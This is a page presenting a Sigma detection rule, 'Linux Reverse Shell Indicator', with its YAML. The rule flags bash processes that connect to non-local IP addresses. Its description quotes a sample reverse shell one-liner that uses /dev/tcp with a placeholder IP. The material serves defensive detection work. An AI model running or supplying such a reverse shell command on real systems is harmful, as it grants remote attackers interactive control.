---
title: "Linux Reverse Shell Indicator"
aliases:
  - "/rule/83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871"
ruleid: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871



status: experimental





date: Sat, 16 Oct 2021 14:21:55 +0200


---

Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')

<!--more-->


## Known false-positives

* Unknown



## References

* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md


## Raw rule ([edit](https://github.com/SigmaHQ/sigma/edit/master/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml))
```yaml
title: Linux Reverse Shell Indicator
id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
status: experimental
description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
references:
   - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
date: 2021/10/16
author: Florian Roth
logsource:
   product: linux
   category: network_connection
detection:
   selection:
      Image|endswith: '/bin/bash'
   filter:
      DestinationIp: 
         - '127.0.0.1'
         - '0.0.0.0'
   condition: selection and not filter
falsepositives:
   - Unknown
level: critical


```
